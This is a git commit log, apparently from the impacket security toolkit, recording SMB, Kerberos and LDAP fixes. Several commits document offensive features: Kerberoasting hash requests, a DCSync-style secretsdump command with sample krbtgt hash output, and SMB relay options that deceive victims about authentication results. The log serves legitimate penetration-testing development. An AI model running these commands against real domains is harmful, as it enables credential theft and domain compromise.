Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:43:19 2016 +0200

    Added some comments and input parameter value validation

commit a8354a1b7424a0bac07a520870f957a8dffeaa6f
Author: mgeeky <mgeeky@users.noreply.github.com>
Date:   Wed May 18 17:42:31 2016 +0200

    Added option to specify return status code after connecting client's successful authentication (relayed). This will be useful in cases in which we do not want to let connecting client store credentials that succeeded (i.e. remember them and proceed with successful authentication). There are some cases in which we may want to inform the client that his credentials were invalid (STATUS_LOGON_FAILURE) where in fact they went through. Also, we may mislead the client with information that the Access is Denied when authentication to e.g. ADMIN$ share at the server.

commit caf47e5f76d27b8e2c23ad40a75bc96920ea8434
Author: asolino <bethus@gmail.com>
Date:   Mon May 16 09:23:23 2016 -0300

    Fixes broken connection if -dc-ip is not specified
    
    * Introduced in latest commit. Should work now

commit 5fa74d87f2e5df69fb71e6d81b312b46c9801dfd
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 20:44:00 2016 -0300

    Reformating code

commit d4d6de0edf373322bddeef8b571eaa2f7da8b64e
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:54:28 2016 -0300

    Making DCERPC/LDAP/Kerberos IPv6 compliant
    
    * Looks like IPv6 is still not used much ;). These tiny things were preventing IPv6 from working at the DCERPC/LDAP/Kerberos layers.
    * SMB was working correctly

commit 2a36f54dd8b767113fc42d3117e8a3a30deb9959
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:23:27 2016 -0300

    Adding more statements into the try: execept.
    
    * It wasn't behaving well when no stringbinding was chosen for target

commit 01ad6ac79d344a0ba2c69f6c8893ce8ecfd2ccca
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 19:17:57 2016 -0300

    Warn if we couldn't find a valid string binding.. Shouldn't be common

commit 8d8aab419fa17ce7d922a307f1c7ed0ed8e0b130
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:47:15 2016 -0300

    Empty domain check fixed

commit b6f28459970a4fc0a63dce9323da97287ada1322
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:46:20 2016 -0300

    Reformating code
    
    * To keep it within 80 chars wide
    * Empty domain check fixed

commit 21a58e81d95a9b6e609290fdb7640d341025139d
Author: asolino <bethus@gmail.com>
Date:   Sun May 15 18:29:34 2016 -0300

    Improved stringBinding selection
    
    * As reported in https://github.com/CoreSecurity/impacket/issues/158, there could be some instances where the wrong stringBinding would be chosen.
    * Testing needed to verify it's now working well

commit 061917c20430908b702a707e0c5b200375cc1c7d
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 16:30:41 2016 -0300

    Adding -save parameter
    
    * Saves each TGS downloaded in ccache format. Why? If we later on crack any password we can just edit that one and make it silver

commit 75c647513bc124d7a8a7664ff161e04774e00172
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 16:29:34 2016 -0300

    Replacing class variables for instance variables
    
    * Don't know why I did it this way to begin with. Not needed

commit 14010a4142004e5a048481b99f5911bfe03c0a92
Author: asolino <bethus@gmail.com>
Date:   Sat May 14 15:47:16 2016 -0300

    -dc-ip parameter moved to the authentication group
    
    * makes more sense. Should do the same for goldenPac and probably and this option for all scripts

commit 9d717a318a888aa1659385f724e0f90c7fa8a62e
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:35:09 2016 -0300

    This script should now work w/o requiring DNS resolution
    
    * Even if Kerberos authentication is specified

commit a1117e84ff2c300773d2faed72262f4558a03ef0
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:20:56 2016 -0300

    Fixes small typo
    
    * It was copied from goldenPac.py

commit 0d73b2c858ca3e46ad6b89ef4dcb1f76920b03d7
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 20:17:07 2016 -0300

    Adding -dc-ip command line option
    
    * Allows specifying what the IP for the domain is.
    * It assumes the DC and KDC resides in the same server
    
    e.g.
    ./GetUserSPNs.py -dc-ip 172.16.123.170 -request freefly.net/normaluser

commit fcf0c2ad8f52c277bd9072da93b7028607d6ba97
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:24:46 2016 -0300

    Fix when dumping CLEARTEXT password for machine accounts
    
    * We won't utf-16 decode them, we will just print it in hex

commit 162b23bf0b8c24d2ce7388793a79b428780ea617
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:18:01 2016 -0300

    Fix error when passing NTLM hashes for authentication

commit eaf8a03251e4fb87af289e9ba33eaebaa6617a0f
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 19:07:30 2016 -0300

    Adding -request and -outputfile options
    
    * -request picks SPNs for unique usernames and outputs JtR/hashcat format
    * -outputFile, well.. outputs to a file for later cracking :)
    
    Sample usage:
    ./GetUserSPNs.py freefly.net/normaluser7 -request -outpufile /tmp/hashes.txt

commit 2a185c1ecc0b0a56467f12dfccbd5672ed95adaa
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:47:08 2016 -0300

    Adding GetUserSPNs (part of Kerberoast attack)
    
    This module will try to find Service Principal Names that are associated with normal user account.
    Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
    will encrypt the ticket with the account the SPN is running under, this could be used for an offline
    bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
    This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
    https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
    
    Original idea of implementing this in Python belongs to @skelsec and his
    https://github.com/skelsec/PyKerberoast project
    
    This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
    Also, disabled accounts won't be shown.
    
    ToDo:
    [ ] Add the capability for requesting TGS and output them in JtR/hashcat format
    [ ] Improve the search filter, we have to specify we don't want machine accounts in the answer
        (play with userAccountControl)

commit 501ef71b737ebef4928d655eeb21e52ceba859af
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:44:36 2016 -0300

    Adding ldap directory to the setup.py for library installation

commit 53477252e67bab62d86e571b04d91d7ff8d74917
Author: asolino <bethus@gmail.com>
Date:   Fri May 13 12:39:59 2016 -0300

    Adding a minimalistic LDAP implementation
    
    * Supports ldap and ldaps
    * Supports Pass the hash, ticket and key
    * Only search is available (and you need to build the search filter yourself)

commit 375b9972dc5696a1967df56a3cec3d87c64b9a47
Author: asolino <bethus@gmail.com>
Date:   Sat May 7 16:54:43 2016 -0300

    Changes the output filename based on the share specified.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/156
    * Debug message added

commit 34e5a814ce37fa43aae6168b423185cc6b9347cd
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 15:39:23 2016 -0300

    Updated test cases

commit f8b900f2a8adae3dbfb79c123f76f2b57a2022a3
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:56:46 2016 -0300

    Remaining fixes for ERROR_DS_DIFFERENT_REPL_EPOCHS
    
    * Test cases and raiseChild were also affected

commit 106934377c2ea4d41458d97f42807057b97250ec
Merge: 5b92375f 4ee5c841
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:44:17 2016 -0300

    Merge branch 'skelsec-master'

commit 4ee5c841263ba5c7ecab2a542cf064180931b183
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 14:43:05 2016 -0300

    Creating new cipher based on received keytype
    
    * This was preventing pass-the-key attacks to work

commit ea0a1e364aa863cbe8fba772ec0036d873c6ed58
Merge: 5b92375f 63c4aaf5
Author: asolino <bethus@gmail.com>
Date:   Fri May 6 13:29:28 2016 -0300

    Merge branch 'master' of https://github.com/skelsec/impacket into skelsec-master

commit 5b92375f9f0143fbc5cef49294d86ae2c6aa788c
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 11:35:54 2016 -0300

    pwdLastSet is also included in the output file
    
    * According to @mubix this won't interfere with JtR :)

commit b6b2b1db7cd4ffbf38ed2e905b047daa8d6bc19a
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 11:23:52 2016 -0300

    More debug messages added

commit bcff6bc38cf8441723f06c307e68aaa6f40b31dc
Author: asolino <bethus@gmail.com>
Date:   Thu May 5 10:54:15 2016 -0300

    Adding more debug information for helping troubleshooting

commit 63c4aaf5f4ea38ff9218fdf231c098a5026f49b9
Author: skelsec <info@skelsec.com>
Date:   Thu May 5 13:05:32 2016 +0200

    TGS Request sessionkey type update
    
    Here we should use the type that we got back from the server.

commit 5db6cf60cf3acd8c55136da33c6d7a68389787a5
Author: skelsec <info@skelsec.com>
Date:   Thu May 5 13:01:34 2016 +0200

    TGS Request ETYPE field values
    
    etype field here MUST contain rc4_hmac in a windows environment, or the response will be KDC_ERR_ETYPE_NOSUPP.

commit a489c032f2cc2748bb91ae6b24d28308ea210a2b
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 21:21:14 2016 -0300

    Extra line removed. Cosmetic

commit 7c34db9948dd48275d85b6cee7675a2ac1d079b9
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 21:14:45 2016 -0300

    Fix ERROR_DS_DIFFERENT_REPL_EPOCHS when running against a domain with dwReplEpoch != 0
    
    * By default we set dwReplEpoch to 0 when calling DRSBind(). If this call's answer specifies a different dwReplEpoch, then we call DRSBind again with the right one. Otherwise calls will fail later.
    * Thanks @gentilkiwi for reporting it in impacket, @MichaelGrafnetter for reporting it to mimikatz and @rmbolger for reporting it DSInternals :)

commit b05feb2f5aefb1d434f48727785b16b07fd518a5
Author: asolino <bethus@gmail.com>
Date:   Sun May 1 20:32:56 2016 -0300

    Updated test cases
    
    * Added test cases for packet fragmentation and session security (both Kerberos and NTLM)
    * Simplified the structure of the test cases

commit bba72c234ba694cf7b70c94ce1a3a240990d3b1a
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 29 19:58:17 2016 -0300

    Packet fragmentation review
    
    1) Checks the right PDU len based on user input (if set using set_max_fragment_size()) or BIND_ACK answer (max_rfrag)
    2) Fixed wrong signature/encryption calculation when using Kerberos and fragmentation enabled.
    3) Header flags renamed based on C706 standard
    4) Will probably address https://github.com/CoreSecurity/impacket/issues/137

commit 7c49b28ff5a18702f87684d844fdfce127a451a1
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 15 13:14:01 2016 -0300

    Few fixes to SMB Test cases
    
    1. Fix readwriteFile testcase to support large reads
    2. getServerName converting to upper case when comparing
    3. Credentials are now taken from dcetests.cfg (we should change the name in the future)

commit dc4606822e489e62d276bc3c928af31cd860f4a0
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 15 13:09:42 2016 -0300

    STATUS_USER_SESSION_DELETED when downgrading from SMB2_DIALECT_30 to SMB2_DIALECT_21/SMB2_DIALECT_002
    
    * Since we're not supporting multichannel, we're taking the approach described at http://linux-cifs.vger.kernel.narkive.com/WffA8Jw5/status-user-session-deleted-auth-problems-when-downgrading-from-vers-3-0-to-vers-2-0-2-1 by simply randomizing the ClientGUID when negotiating the protocol.
    * This code was triggering the issue:
    
    from impacket.smbconnection import *
    
    USERNAME = 'Administrator'
    PASSWORD = 'admin'
    TARGET = '192.168.1.1'
    
    s1 = SMBConnection(TARGET, TARGET)
    s1.login(USERNAME, PASSWORD)
    
    s2 = SMBConnection(TARGET, TARGET, preferredDialect=SMB2_DIALECT_21)
    s2.login(USERNAME, PASSWORD)
    
    print "ALL GOOD"

commit 49a07a5fa7372abd7a6b5eeec8d039b1add4e86d
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 11 10:58:16 2016 -0300

    Retrieve user principal name from CCache file
    
    * When https://github.com/CoreSecurity/impacket/pull/144/files was merged we forgot to also add
    that support to the getKerberosType1 method.
    * Will probably fix https://github.com/CoreSecurity/impacket/issues/149, needs testing.

commit 19d7cfca5797635abc251324449945ead65c4052
Merge: de8b2556 e42d8e18
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 30 09:29:27 2016 -0300

    Merge pull request #146 from byt3bl33d3r/master
    
    UnboundLocalError in smbconnection.readFile() when recieving STATUS_END_OF_FILE error

commit e42d8e183a8766d49c799348db17b9d0e656ec0a
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Mar 29 23:43:31 2016 -0600

    Fixed while loop in smbconnection.read() when STATUS_END_OF_FILE is received

commit de8b2556789a2e78cd0a16e38f40bc567a6873c9
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 29 16:54:17 2016 -0300

    Fixes offline dump of SAM hashes (no NTDS.DIT)
    
    * This was broken at https://github.com/CoreSecurity/impacket/commit/bbff44d1fc555e2de2ffeef1e9f7bb89afd2946b
    * A proposed solution was PRed here https://github.com/CoreSecurity/impacket/pull/145 . This is basically the same with samller changes
    * Thanks @MrTchuss for finding this!

commit 3b819e2fdea5161d664f9b04cdb89d4a0e8179b5
Merge: 0df01009 94305070
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 28 11:51:26 2016 -0300

    Merge pull request #144 from MrTchuss/master
    
    Retrieve user principal name from CCache file

commit 0df0100998736d949ca9cd8c7e7b2d829952afdc
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 27 15:18:18 2016 -0300

    Honoring extended_security parameter in SMB.neg_session()
    
    * When we did the SMBv1 Unicode support (https://github.com/CoreSecurity/impacket/commit/328caf150446658ec2621e7a2cd28e6c39cc8da0) we changed the default flags1/flags2 from `0` to `SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES`. We forgot tho, to change the behavior en SMB.neg_session() when `extended_security` was set to False. What was happening was the `FLAGS2_EXTENDED_SECURITY` was never removed.
    * This was preventing establishing negotiations with `FLAGS2_EXTENDED_SECURITY` set to False (aka standard security). In particular this was breaking the SMB Reflection use case.

commit 9430507030c931d4edf2465e4411e43719c344be
Author: MrTchuss <mrtchuss@users.noreply.github.com>
Date:   Sat Mar 26 21:07:54 2016 +0100

    Retrieve user principal name from CCache file
    
    If needed, retrieve user and domaine information from KRB5 CCache file.
    This simplifies examples command-line, as user only needs to export
    KRB5CCNAME environment variable after a successful authentication using
    kinit and do not need to specify user principal name on command line:
    $ export KRB5CCNAME=/tmp/krb5cc_1000
    $ smbclient.py -k win2012-dc1.vulnerable.local

commit 04d392083a8621e1f81449f73599ec2238aaf1c6
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 25 23:01:47 2016 -0300

    If we cannot decode Unicode let's print the data w/o decoding
    
    * This could happen when SMB Reflecting against old OSes.

commit c6fb099ba27f978ab762226dffc688f034c3754c
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 25 22:59:41 2016 -0300

    If NT ERROR string is not found just print the error code

commit a71e6bb0f9b04251009f3b995571c03a1dfcb0f8
Merge: 6d42da90 ed375b97
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 24 19:51:01 2016 -0300

    Merge pull request #142 from rrerolle/master
    
    SMB3.create: use proper method to determine SMB2 and SMB2Create headers sizes

commit ed375b97d19575970e6c1d873f28620238488053
Author: Rémi Rérolle <remi.rerolle@gmail.com>
Date:   Thu Mar 24 16:53:51 2016 +0100

    SMB3.create: use proper method to determine SMB2 and SMB2Create headers sizes
    
    This prevents from needing a commentary to explain what those hard-coded values
    stand for.

commit 6d42da9003d28bd6ab3446396c65d9f60de16848
Merge: 518abf37 df4c9552
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 23 14:31:00 2016 -0300

    Merge pull request #140 from rrerolle/master
    
    SMB3.create: define CreateContextsOffset and CreateContextsLength when applicable

commit df4c95522d406455011e9f77c699fb84db891d1d
Author: Rémi Rérolle <remi.rerolle@gmail.com>
Date:   Wed Mar 23 17:54:45 2016 +0100

    SMB3.create: define CreateContextsOffset and CreateContextsLength when applicable
    
    When providing createContexts in a SMB3 create call, the buffer is set
    accordingly, but not the offset and length fields. This causes the createContext
    data to be ignored by the server.
    
    This patch tries to fix this by specifying the offset and length. The offset is
    determined by adding the size of the SMB2 and CREATE_REQUEST headers to the
    name length.

commit 518abf375538f0ed80b84b95fa26e211f78bf80c
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 13:19:43 2016 -0300

    Reverting back previous commit. Problems with some Windows clients
    
    * More research needed. OSx clients now only works if GUEST connection set.

commit b05b4703e702a6e6c48b423d2a7fea05fdab3768
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 13:09:50 2016 -0300

    Setting GUEST flag only if username is 'GUEST'
    
    * This is OSx specific in order to make it work when an OSx client wants to log in with a username/password

commit 3e768cc89080a06b735eed05c0e36e354cd8a86e
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 11 11:49:48 2016 -0300

    Clear NextEntryOffset when SL_RETURN_SINGLE_ENTRY is received
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/136

commit 1f98352aa1b51048e55ea8ddfa356cdde1c30b06
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 8 15:58:26 2016 -0300

    Fixing https://github.com/CoreSecurity/impacket/issues/135
    
    * LOG line left there just in case logging is active already.

commit 9494af8cd8bdb0eb44b20840aaf3f1b67dca49e1
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 2 18:01:35 2016 -0300

    Better controls strip leading '/'/'\\' when running the server in Windows
    
    * Regardless of the share configured, it was always showing the root drive contents (when ran on Windows)

commit 682ce151ddda2f2fd713546cbbec2ce28f79d032
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 29 16:59:04 2016 -0300

    Exposing SMBSERVER in SimpleSMBServer class
    
    * registerNamedPipe, unregisterNamedPipe and getRegisteredNamedPipes
    * Might be helpful if you want to create custom named pipes handlers thru the SimpleSMBServer

commit 1ef7978fe9d0d3baecb702ed2a77e55925e46821
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 29 16:32:51 2016 -0300

    Replacing NTLMSSP_NEGOTIATE_NTLM2 for NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    
    * Makes it easier to understand [MS-NLMP] when you're reading alongside our code

commit 79dda7fcbecb3e7d3e744ae5e4c181871f7ad212
Merge: e8dc587d 2e914bbb
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 26 10:38:35 2016 -0300

    Merge branch 'gadio-master'

commit 2e914bbbf3cafcf82942a637111a4a39a81c9a81
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 26 10:37:24 2016 -0300

    Changing -auth-level-pkt-privacy to -rpc-auth-level
    
    * By default it just let the runtime to decide what's best
    * Added option to enforce packet integrity as well

commit 49b9631104faa508e94496144b33771d462b3c89
Author: Gadi Oren <dbaspdp25g@snkmail.com>
Date:   Sun Feb 14 15:23:03 2016 -0500

    Allow setting packet privacy authentication level

commit e8dc587dab030787f2b2a23afebebae785e8018e
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 3 11:29:23 2016 -0300

    Minor improvements
    
    1) When ran With no parameters, now it runs in reflection mode and dumps target's hashes
    2) When relaying to 127.0.0.1, it's ok not to have a username. Especially important for hot potato attack
    3) Better control of exceptions when authentication succeded

commit 22313cc590b33218a4344e7c7ea48983f00ba89f
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 28 19:07:39 2016 -0300

    Adjusting NegotiateFlags to [MS-NLMP] 2.2.2.5 description
    
    * Check out your code if you were using these flags since names got changed
      according to the standard

commit a358566c98010fc0acc0779fd87980ef4adaac93
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 27 18:08:26 2016 -0300

    Adding -just-dc-user switch to download just a single user data (DRSUAPI mode only)
    
    * Similar to @gentilkiwi's DCSync functionality
    E.g.
    python secretsdump.py Administrator:admin@172.16.123.1 -just-dc-user krbtgt
    
    Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
    
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bf11f756a7cd1a29a9abd8ccc918a805:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:44b77486dd383d7177207bb7393f4ec4176fb80be7dcf5c598221a7a039bc2e9
    krbtgt:aes128-cts-hmac-sha1-96:2eb877b16640e7f60adb362c8e482f11
    krbtgt:des-cbc-md5:4610ea7024fff562
    [*] Cleaning up...

commit 1645f43ccf676ddb234c231816bf22d5ceca3c61
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 12 16:36:58 2016 -0300

    Upgrade Copyright

commit aa8bda15ebd49ce3aebb2691ccd1e8221aa7d885
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 11 18:29:46 2016 -0300

    Typo fix

commit 1cdc5ce8afff9236140edab1229a15e02cbf09d6
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 11 18:12:15 2016 -0300

    Adding support for Win2016 TP4 in LOCAL or -use-vss mode
    
    The main things that changed when raw parsing the NTDS.DIT are:
    1. The encryptedPEK header changed from '\x02\x00\x00\x00' to '\x03\x00\x00\x00'. Instead of
       using MD5 / RC4 it now uses AES to decrypt the PEK lists. Right now I only support 1 PEK
       key until I can repro having more than a key on this OS. Maybe @s0crat can help here ;).
    2. The decrypted PEK list is different from previous versions and the PEK Key sits in the
       middle of the decrypted buffer. I still need to understand what the other bytes are for.
    3. When decrypting NTHashes and supplemental information, the structure header changes from
       '\x11\x00\x00\x00' to '\x13\x00\x00\x00'. Instead of using RC4 it now uses AES. The
       structure here is a little different too, whereas the buffer for decryption starts 4
       bytes after a similar buffer in pre Win2016 TP4.
    
    Lot's of testing needed. Later on I'll work on simplifying the code.
    
    * Big thanks to @gentilkiwi for telling me about the issue and also giving me important info to come up with the solution.
    * DRSUAPI mode (the default one) worked out of the box
    * Moved __descryptAES to CryptoCommon since it's used on a few more places

commit f33daa056fd7cee38c2d65fdb42624ecaae09704
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 13:11:55 2016 -0300

    Going back to dev version

commit 67fc19e9996148add1b1e2a8b912fe8c95b51692
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 12:35:14 2016 -0300

    Updated Changelog

commit 0d34fd9365765c8c1d25e77393646d91d84da28a
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 7 11:12:01 2016 -0300

    Upcoming version

commit 8c04d9697939172c9159af92ddd0eded221f2106
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 14:08:30 2016 -0300

    Updating copyright notice. Welcome 2016

commit ac31fea5c1578e37eace0df83f1c2bf05350140e
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 13:25:31 2016 -0300

    Removing old DCERPC runtime files.
    
    * Scripts still using this old runtime should port to impacket.dcerpc.v5 classes
    * All examples should be using V5

commit 118688065e062e5f28307015d120b4ef4b1a3dd3
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 11:25:32 2016 -0300

    Moving KNOWN_UUIDS to epm.py before ditching the old dcerpc runtime

commit a4dc7d52f6ad3851ea29bbcf8938611df061eec1
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 11:21:47 2016 -0300

    Moving KNOWN_UUIDS to epm.py before ditching the old dcerpc runtime

commit 638a235b47157183cdc1cba940dfc9cb94c7fb28
Merge: 1140d519 e4d48634
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 10:28:54 2016 -0300

    Merge branch 'byt3bl33d3r-master'
    
    Thanks @byt3bl33d3r!

commit e4d4863430279b8b744e830a96bcddc8a0698562
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 6 10:27:27 2016 -0300

    Grabbing and printing command output when using -c switch
    
    * Also removing temp file

commit 5c6a3aee8ca6e506d2f4f4ebfd3c0fc6693e7ac5
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Jan 5 19:28:04 2016 -0700

    added option to execute commands in smbrelayx.py

commit 1140d519495e6d797d40e2b6db206f02e683b7d0
Merge: 1ef6af5a cb697154
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 5 13:00:06 2016 -0300

    Merge pull request #123 from mubix/patch-1
    
    Add Domain Admins RID

commit cb697154c084c265ad9f9537c62590dd46e41e1b
Author: Rob Fuller <jd.mubix@gmail.com>
Date:   Tue Jan 5 10:47:20 2016 -0500

    Add Domain Admins RID
    
    Source: https://msdn.microsoft.com/en-us/library/cc223144.aspx

commit 1ef6af5ac2493a93bcaee42f2af79df39b98cf6c
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 17 16:40:09 2015 -0300

    Minor cosmetic changes

commit b4c43aba5cdb8edc21a046263eb902885bfdc547
Merge: 270dcce3 88ccb48f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 17 09:00:55 2015 -0300

    Merge pull request #120 from sjitech/master
    
    smbclient.py: "cd" command failed to enter JUNCTION or read-only dire…

commit 88ccb48f2758caf2ff6e145da5bab426ab588ea2
Author: q <osexp2003@gmail.com>
Date:   Thu Dec 17 19:20:16 2015 +0900

    smbclient.py: "cd" command failed to enter JUNCTION or read-only directory

commit 270dcce3f2ff50106adab3c7a299d8549f67112f
Merge: 0999641a 08caa1d6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 12:02:45 2015 -0300

    Merge branch 'sjitech-master'

commit 08caa1d6ee153af83ab02b87ba017450a429a985
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 11:51:07 2015 -0300

    Small change to decide when to disconnect a DCE connection

commit 616bdf952d7cc299d1dd4585ed4b6452fcb7f8bc
Merge: 0999641a 264ac838
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 15 11:43:27 2015 -0300

    Merge branch 'master' of https://github.com/sjitech/impacket into sjitech-master

commit 264ac838c5c75a28cddaa5956c8e68fa419ff496
Author: q <osexp2003@gmail.com>
Date:   Tue Dec 15 09:50:05 2015 +0900

    let hept_lookup use existing SMB transport if specified, instead of always use TCP 135 port

commit 0999641aea3633c3a80407424178b2496ab4fc4f
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 14 14:36:32 2015 -0300

    Extending NdTable's data to more than 16 properties
    
    * NdTable is an encoded table that represents the behavior of the default value of properties in a CIM class. ([MS-WMIO] Section 2.2.26
    * The implementation I had was limiting the amount of parameters to pack when marshalling a class/instance to 16.
    * Now it should support the amount of properties defined by the class.
    * I'm still not sure tho, the encoding I'm using is the right one. [MS-WMIO] does not specify this.
    * Found this while addressing https://github.com/CoreSecurity/impacket/issues/117

commit e13e0baa1ac9973eb4df85e6be0af2a2e975bdd3
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 3 10:09:58 2015 -0300

    DCOM INTERFACE Connections are not reused by different threads
    
    * Reusing them could trigger out of sync issues. Instead, a new connection is created by each thread.
    * This aims to fix https://github.com/CoreSecurity/impacket/issues/114

commit 1f8370e56b01cb183dee03e2a150302810a81925
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 30 15:49:07 2015 -0300

    Applying @jammer3d patch to fix https://github.com/CoreSecurity/impacket/issues/108
    
    Thanks and sorry for the delay!

commit 5851bd0cb903a91db0db8d225ee85be8cf2b734d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 26 14:55:19 2015 -0300

    Applying @0xsauby fix for password with '@' to the rest of the example scripts

commit f1d5337aae359615aa891fa2f83d49ad349540de
Merge: 836463be 6913c132
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 26 14:48:46 2015 -0300

    Merge pull request #112 from 0xsauby/master
    
    Broken auth, thanks @0xsauby!

commit 6913c1327005cc49067f2974b9d7c95046d0d15a
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:52:20 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 827a5594bf00ab54d447fc7b793c4165a15885c3
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:51:17 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit df661f4c145dbc3d861fce222d931446f602e8b6
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:48:27 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 6e4a78a33d502ebd23fb5f6b27c281179a5d6fd1
Merge: 86c07438 97f0412f
Author: 0xsauby <saurabh.harit@gmail.com>
Date:   Fri Nov 20 02:37:47 2015 -0500

    Merge branch 'master' of https://github.com/0xsauby/impacket

commit 86c07438310d360156d14c2c0edbd04dcd772531
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:19:15 2015 -0500

    Fixed the issue where a password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) will break auth.

commit 97f0412f3e0a658703fd33e5dd6111d40cb191b4
Author: Saurabh Harit <0xsauby@users.noreply.github.com>
Date:   Fri Nov 20 02:19:15 2015 -0500

    Fixed the issue where the password with '@' breaks authentication
    
    Since impacket scripts use '@' as delimiter between the password and the IP address, a password with '@' (eg. 16char@Password) breaks the authentication.

commit 836463be6bf19c6e2207d054153570cb112ab42a
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 4 11:40:24 2015 -0300

    Default `SMBConnection.readFile()` to a single SMB call attempt
    
    * That means it cannot be guaranteed all the bytes requested will be read
    * I'll leave it this way until I figure out some incompatibilities with other use cases (e.g. psexec)

commit f544da0e78af708e45c20af6ae7f450ed773e473
Merge: 3e5f763e 1677bcfc
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:54:02 2015 -0300

